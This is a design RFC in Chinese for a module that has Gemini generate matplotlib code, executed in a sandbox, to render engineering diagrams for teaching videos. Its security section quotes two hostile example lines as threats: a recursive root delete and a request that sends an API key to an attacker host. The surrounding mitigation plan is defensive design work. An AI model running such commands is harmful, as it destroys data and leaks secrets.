# diagram_gen.py — 工程圖 AI 輔助 RFC (v4 階段 2 E)

> 把「老師講解材料力學 / 自動控制 / 風機系統」常用的工程圖(自由體圖、彎矩圖、方塊圖、電路圖)從手繪變成 AI 一鍵生成。對材料力學影片價值跳一階(學生最痛點 = 不會畫圖)。

---

## 動機

當前 `pipeline.py` 的 step 已支援 `image` 欄位(`svg_*.png` cached + `_overlay_teacher_photo`)。但圖檔目前要老師手畫(matplotlib / 繪圖板 / 用其他工具),工作量大。

材料力學典型痛點:
- 自由體圖(梁、桁架、力素受力分布)
- 內力圖(彎矩圖 M-x / 剪力圖 V-x)
- 應力圖(σ-ε 曲線、Mohr 圓)
- 方塊圖(控制系統 transfer function block diagram)

每張圖手畫 5~15 分鐘,一支 5 題影片可能要畫 20 張。AI 自動化後一張 10 秒。

---

## 技術選型 — 兩條候選

### 候選 A:Gemini 產 matplotlib code → exec → PNG ✨ 建議優先

**流程**:
```
Gemini(描述 + 範例 code) → matplotlib python code → exec(code) → PNG bytes
```

優點:
- Python 原生,deps 已有 (Pillow / fontTools 已裝)
- 失敗易 debug(看 Gemini 輸出 code,人類可讀)
- 廣泛社群範例(matplotlib 是科學繪圖標準)
- 不需 TeX install

缺點:
- 工程圖品質依 Gemini code 能力,複雜結構可能難看
- exec 安全性(Gemini code 跑本機 = 程式碼注入風險,要 sandbox)

### 候選 B:Gemini 產 TikZ → LaTeX → PNG

優點:
- TikZ 是工程圖事實標準,品質最高
- 自由體圖、電路圖 LaTeX 套件成熟(circuitikz / pgfplots)

缺點:
- 需 LaTeX install(Windows ~3GB,Docker image 暴漲)
- 編譯慢(2-5 秒/張)
- TikZ syntax 對 LLM 較難(範例少)

### 建議

**v4 階段 2 E 走 A**(matplotlib + sandbox exec)。TikZ 進階待 v5 真有教學需求再評估。

---

## 設計

### 主要 API

```python
def generate_diagram(spec: DiagramSpec) -> Path | None:
    """產一張工程圖, 回 PNG 路徑. 失敗回 None (不擋 pipeline)."""
```

### Schema

```python
class DiagramKind(str, Enum):
    """常用工程圖類別 — 跟 prompt template 對應."""
    FREE_BODY = "free_body"           # 自由體圖
    BENDING_MOMENT = "bending_moment" # 彎矩圖 M-x
    SHEAR = "shear"                   # 剪力圖 V-x
    STRESS_STRAIN = "stress_strain"   # 應力-應變曲線
    BLOCK_DIAGRAM = "block_diagram"   # 控制系統方塊圖
    CIRCUIT = "circuit"               # 電路圖 (簡單版, 複雜走 TikZ future)
    GENERIC = "generic"               # 其他 — 純文字描述

class DiagramSpec(TypedDict):
    kind: str                     # DiagramKind 的 value
    description: str              # 中文 / 英文描述, 給 Gemini 看
    out_path: str                 # 輸出 PNG 絕對路徑
    width: int                    # 預設 800
    height: int                   # 預設 600
    dpi: int                      # 預設 100
```

### Sandbox exec 安全性

Gemini code 要 exec → 風險:
- 寫 `import os; os.system("rm -rf /")` → 致命
- 寫 `requests.get("http://attacker.com?key=" + os.environ["GEMINI_API_KEY"])` → 洩漏

緩解:
- **subprocess sandbox**:`subprocess.run(["python", "-c", code], timeout=30, env={})` 隔離環境變數
- **AST allowlist**:exec 前 `ast.parse(code)` 檢查只允許 matplotlib / numpy import
- **timeout**:30 秒上限
- **不開網路**:env={"PYTHONPATH": ""}(雖然不能完全擋)

更安全的路線:**Gemini code → 寫 .py 檔 → docker run --network none → mount 只可寫 /tmp/out → 讀出 PNG**(留 production-ready 版做)

階段 2 E v1 走 subprocess + AST allowlist 起步。

---

## v4 階段 2 E 拆 4 個 iter

1. **scaffold + design RFC**(本 iter 18) ← 我們在這
2. `_render_matplotlib_diagram` 基礎實作(subprocess exec + AST 檢查) + tests with mock
3. Gemini call `_propose_matplotlib_code(spec)` + JSON parse + tests with mock
4. 整合 pipeline.py step image 欄位 + 真實案例 demo(等 user 給 spec 試)

---

## STOP 條件

- **第一張圖跑出來品質**:Gemini matplotlib code 對工程圖夠不夠專業?要不要調 prompt 或加範例?
- **sandbox 設計足夠嗎**:AST allowlist 對 generated code 是否擋得住惡意 escape?
- **是否整合到 React UI**:user 在哪裡輸入 DiagramSpec?step editor 加一個 button?

---

## 不在這個 RFC 範圍

- TikZ 候選 B(留 v5+)
- 動畫(matplotlib animation 影片合成,目前 step image 是靜態圖)
- 跨多語言(現在 prompt 假設中文輸入,可未來加英文)
- 線上預覽(現在直接寫 PNG 檔)
